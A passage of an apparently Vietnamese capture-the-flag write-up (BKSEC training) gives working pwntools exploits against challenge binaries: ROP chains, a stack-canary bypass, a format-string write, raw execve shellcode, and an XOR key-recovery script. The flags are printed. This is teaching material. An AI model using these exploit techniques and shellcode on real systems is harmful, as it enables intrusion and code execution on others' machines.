+<p>Dễ thấy chỉ cần <code class="language-plaintext highlighter-rouge">a1 = a2 = 0xDEADBEEFDEADBEEF</code> thì chúng ta sẽ lấy được shell. Sử dụng gdb, ta thấy giá trị 2 thanh ghi <code class="language-plaintext highlighter-rouge">rdi</code> và <code class="language-plaintext highlighter-rouge">rsi</code> được so sánh với 0xDEADBEEFDEADBEEF. Từ đây, chúng ta cần tìm các ROP-Gadget để kiểm soát giá trị cho 2 thanh ghi này. Nhiệm vụ này cũng chính là tên của bài toán “Rộp”.</p>
+
+<p><img src="/images/bktrain2024/image-4.png" alt="alt text" /></p>
+
+<p><strong>Lời giải</strong></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./bof_2</span><span class="sh">"</span><span class="p">)</span>
+<span class="c1"># p = process(elf.path) 
+</span><span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">6011</span><span class="p">)</span>
+
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x00000000004011e5</span>
+<span class="n">pop_rsi</span> <span class="o">=</span> <span class="mh">0x00000000004011ee</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="mh">0x000000000040101a</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x48</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xDEADBEEFDEADBEEF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xDEADBEEFDEADBEEF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">"</span><span class="s">win</span><span class="sh">"</span><span class="p">])</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">number: </span><span class="sh">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><strong>Đáp án: BKSEC{2–&gt;\xupgrade\xBuffer\xOv3rfl0w\x1s\xn0t\xchiLL\xhixxxxxxxxxxxxxx}</strong></p>
+
+<h3 id="bài-pwn3">Bài pwn3</h3>
+
+<p>Về cơ bản, ý tưởng giải bài này y hệt bài phía trên. Chỉ khác ở bài này có thêm cờ canary được bật.</p>
+
+<p><strong>Lời giải</strong></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./bof_3</span><span class="sh">"</span><span class="p">)</span>
+<span class="c1"># p = process("./bof_3")
+</span><span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">6021</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">is: </span><span class="sh">'</span><span class="p">)</span>
+<span class="n">canary</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">().</span><span class="nf">strip</span><span class="p">().</span><span class="nf">decode</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">canary</span><span class="sh">"</span> <span class="o">+</span> <span class="nf">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
+
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x0000000000401205</span>
+<span class="n">pop_rsi</span> <span class="o">=</span> <span class="mh">0x000000000040120e</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="mh">0x0000000000401398</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x58</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xDEADBEEFDEADBEEF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xDEADBEEFDEADBEEF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">"</span><span class="s">win</span><span class="sh">"</span><span class="p">])</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">number: </span><span class="sh">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><strong>Đáp án: BKSEC{W3_4LL_Hat3_c4NARY}</strong></p>
+
+<h3 id="bài-raising-the-hero">Bài Raising the hero</h3>
+
+<p>Kiểm tra các lớp bảo vệ của file</p>
+<blockquote>
+  <p>Canary                        : ✓
+    NX                            : ✓
+    PIE                           : ✘
+    Fortify                       : ✘
+    RelRO                         : ✘</p>
+</blockquote>
+
+<p>Load chương trình vào IDA32, chúng ta thấy có lỗ hổng FMT ở dòng <code class="language-plaintext highlighter-rouge">printbuffer(buf)</code>.</p>
+
+<p><img src="/images/bktrain2024/image-5.png" alt="alt text" /></p>
+
+<p>Đây là dạng bài <code class="language-plaintext highlighter-rouge">ret2win</code>, chúng ta chỉ cần thay đổi giá trị <code class="language-plaintext highlighter-rouge">target = 0x6F726568</code> sẽ có được shell.</p>
+
+<p><strong>Lời giải</strong></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./fmt_1</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">6101</span><span class="p">)</span>
+
+<span class="n">target</span> <span class="o">=</span> <span class="mh">0x0804B39C</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">%</span><span class="si">{</span><span class="mh">0x6568</span><span class="si">}</span><span class="s">c%23$n</span><span class="sh">'</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">%</span><span class="si">{</span><span class="mh">0x6F72</span> <span class="o">-</span> <span class="mh">0x6568</span><span class="si">}</span><span class="s">c%24$n</span><span class="sh">'</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">P</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">say?</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Phân tích một chút về lời giải trên. Do PIE tắt nên địa chỉ biến <code class="language-plaintext highlighter-rouge">target</code> không thay đổi. Chúng ta cần quan sát và đếm trên stack để biết được chính xác vị trí của <code class="language-plaintext highlighter-rouge">target</code>.</p>
+
+<p>Để gán cho <code class="language-plaintext highlighter-rouge">target = 0x6F726568</code>, ta phải chia ra làm 2 phần, vì khi truyền 0x6F726568 kí tự cho <code class="language-plaintext highlighter-rouge">target</code> thì sẽ quá lâu. Vì vậy, ta sẽ gán 0x6568 cho <code class="language-plaintext highlighter-rouge">target</code> và 0x6F72 cho <code class="language-plaintext highlighter-rouge">target+2</code>. Lưu ý rằng, <code class="language-plaintext highlighter-rouge">$n</code> đếm số byte ở trước đó được ghi, vậy nên khi gán giá trị cho <code class="language-plaintext highlighter-rouge">target+2</code>, chúng ta chỉ cần gán 0x6F72 - 0x6568 (bytes) mà thôi.</p>
+
+<p><strong>Đáp án: BKSEC{R41s1ng_th3_H3rO}</strong></p>
+
+<p><strong>Tham khảo:</strong></p>
+<ul>
+  <li><a href="https://www.youtube.com/watch?v=uet1ixUN8Gg">Bài 16: Format String - Ghi dữ liệu bằng %n</a></li>
+</ul>
+
+<h3 id="bài-shell_1">Bài shell_1</h3>
+
+<p>Load file vào IDA, yêu cầu bài này chỉ là viết shellcode đơn giản</p>
+
+<p><img src="/images/bktrain2024/image-6.png" alt="alt text" /></p>
+
+<p><strong>Lời giải</strong></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">./shell_1</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">6071</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05</span><span class="sh">'</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">(max 256 bytes):</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+<p><strong>Đáp án: BKSEC{ju$7_A_5imPLE_ShelLCODE}</strong></p>
+
+<h2 id="crypto">Crypto</h2>
+
+<h3 id="bài-b64-recovery">Bài B64 Recovery</h3>
+
+<p>Đề bài cho chúng ta source code như sau</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">base64</span>
+<span class="kn">import</span> <span class="n">random</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="sh">'</span><span class="s">BKSEC{still secret}</span><span class="sh">'</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">flag</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">decode</span><span class="p">()</span>
+<span class="n">key</span> <span class="o">=</span> <span class="sh">""</span> <span class="c1">#guess it if u can
+</span><span class="n">encode</span> <span class="o">=</span> <span class="sh">""</span>
+<span class="n">pivot</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="nf">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">i</span> <span class="o">=</span> <span class="n">pivot</span>
+<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">:</span>
+    <span class="n">encode</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">^</span><span class="nf">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
+    <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="n">i</span> <span class="o">%=</span> <span class="nf">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+<span class="n">output</span> <span class="o">=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span> <span class="o">+</span> <span class="nf">chr</span><span class="p">(</span><span class="n">pivot</span><span class="p">)</span> <span class="o">+</span> <span class="n">encode</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Từ <code class="language-plaintext highlighter-rouge">output</code>, chúng ta có thể biết một số thông tin như sau</p>
+<ul>
+  <li>Độ dài <code class="language-plaintext highlighter-rouge">flag</code> sau khi encode base64 là 68</li>
+  <li>Giá trị ngẫu nhiên <code class="language-plaintext highlighter-rouge">pivot</code></li>
+  <li>Đoạn mã encoded</li>
+</ul>
+
+<p>Lưu ý: <code class="language-plaintext highlighter-rouge">flag</code> mà chúng ta nhắc tới ở đây là sau khi đã bị mã hóa base64, không phải flag ban đầu.</p>
+
+<p>Thuật toán bài toán này rất đơn giản, đem xor giá trị của <code class="language-plaintext highlighter-rouge">flag[i]</code> với <code class="language-plaintext highlighter-rouge">key[pivot % len(key)]</code>.</p>
+
+<p>Nhờ việc connect server liên tục, ta có thể đoán được <code class="language-plaintext highlighter-rouge">len(key) = 50</code></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># brute-force to find len of key
+</span><span class="n">x</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">100000</span><span class="p">):</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
+
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+
+    <span class="n">lenflag</span> <span class="o">=</span> <span class="mi">68</span> 
+    <span class="n">pivot</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">x</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">pivot</span><span class="p">))</span>
+
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">pivot </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">pivot</span><span class="p">))</span>
+
+<span class="n">x</span><span class="p">.</span><span class="nf">sort</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Kế tiếp, ta đã biết được <strong>flag gốc</strong> bắt đầu bằng cụm từ <strong>BKSEC{</strong>. Thử một số phép thử với mã hóa base64, ta nhận thấy flag sau khi encode luôn bắt đầu bằng <strong>QktTRUN7</strong>.</p>
+
+<p>Do ta đã biết đoạn <code class="language-plaintext highlighter-rouge">encoded</code>, kết hợp thuật toán nêu trên. Ta có thể tìm lại được <code class="language-plaintext highlighter-rouge">key</code> bằng cách cho connet server liên tục để khôi phục.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># brute-force to find key
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
+
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+    <span class="n">encoded</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">::].</span><span class="nf">strip</span><span class="p">()</span>
+    <span class="n">pivot</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+        <span class="n">key</span><span class="p">[(</span><span class="n">pivot</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">%</span> <span class="mi">50</span><span class="p">]</span> <span class="o">=</span> <span class="n">encode</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">^</span> <span class="nf">ord</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="n">j</span><span class="p">])</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+    
+    <span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Từ đây, ta có được <code class="language-plaintext highlighter-rouge">key</code> và việc giải bài toán còn lại là hoàn toàn dễ dàng</p>
+
+<p><strong>Lời giải</strong></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="n">base64</span>
+
+<span class="c1"># brute-force to find len of key
+</span><span class="n">x</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">100000</span><span class="p">):</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
+
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+
+    <span class="n">lenflag</span> <span class="o">=</span> <span class="mi">68</span> 
+    <span class="n">pivot</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">x</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">pivot</span><span class="p">))</span>
+
+    <span class="c1"># print(data)
+</span>    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">pivot </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">pivot</span><span class="p">))</span>
+    <span class="c1"># p.close()
+</span>
+<span class="n">x</span><span class="p">.</span><span class="nf">sort</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+
+<span class="n">lenflag</span> <span class="o">=</span> <span class="mi">68</span>
+<span class="n">lenkey</span> <span class="o">=</span> <span class="mi">50</span> 
+<span class="n">flag</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">Q</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">k</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">t</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">T</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">R</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">U</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">N</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">7</span><span class="sh">'</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="sh">''</span><span class="p">]</span> <span class="o">*</span> <span class="mi">60</span>
+<span class="n">key</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">50</span>
+
+<span class="c1"># brute-force to find key
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
+
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+    <span class="n">encoded</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">::].</span><span class="nf">strip</span><span class="p">()</span>
+    <span class="n">pivot</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+        <span class="n">key</span><span class="p">[(</span><span class="n">pivot</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">%</span> <span class="mi">50</span><span class="p">]</span> <span class="o">=</span> <span class="n">encode</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">^</span> <span class="nf">ord</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="n">j</span><span class="p">])</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+    
+    <span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+
+<span class="n">key</span> <span class="o">=</span> <span class="p">[</span><span class="mi">73</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">117</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">117</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">46</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">67</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="mi">33</span><span class="p">]</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+<span class="n">encoded</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">::].</span><span class="nf">strip</span><span class="p">()</span>
+<span class="n">pivot</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">decoded</span> <span class="o">=</span> <span class="sh">''</span>
+
+<span class="n">i</span> <span class="o">=</span> <span class="n">pivot</span>
+<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">encoded</span><span class="p">:</span>
+    <span class="n">decoded</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">c</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">50</span><span class="p">])</span>
+    <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="n">i</span> <span class="o">%=</span> <span class="mi">50</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">decoded</span><span class="p">))</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><strong>Đáp án: BKSEC{W0vv_1_d0nt_th1nk_y0u_c4n_r3c0v3r_my_m3554g3}</strong></p>
+ -->
+  </div>
+
+  <div id="disqus_thread"></div>
+
+</article>
+      </div>
+    </div>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">George Do</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li>George Do</li>
+          <li><a href="mailto:contact.georgedo@gmail.com">contact.georgedo@gmail.com</a></li>
+          <!-- <li><script type="text/javascript" id="clustrmaps" src="//clustrmaps.com/map_v2.js?d=bWWMtUHXhX4_KVnkJ-k1GL_PEZEA0lCjHMP81H6JXAA&cl=ffffff&w=a"></script></li> -->
+          <li><script type="text/javascript" id="clstr_globe" src="//clustrmaps.com/globe.js?d=hTxyDCpAFGmse2NCHLjlA3079v7NSBHXIjnN8mG-hlE"></script></li>
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-2">
+        <ul class="social-media-list">
+          
+          <li>
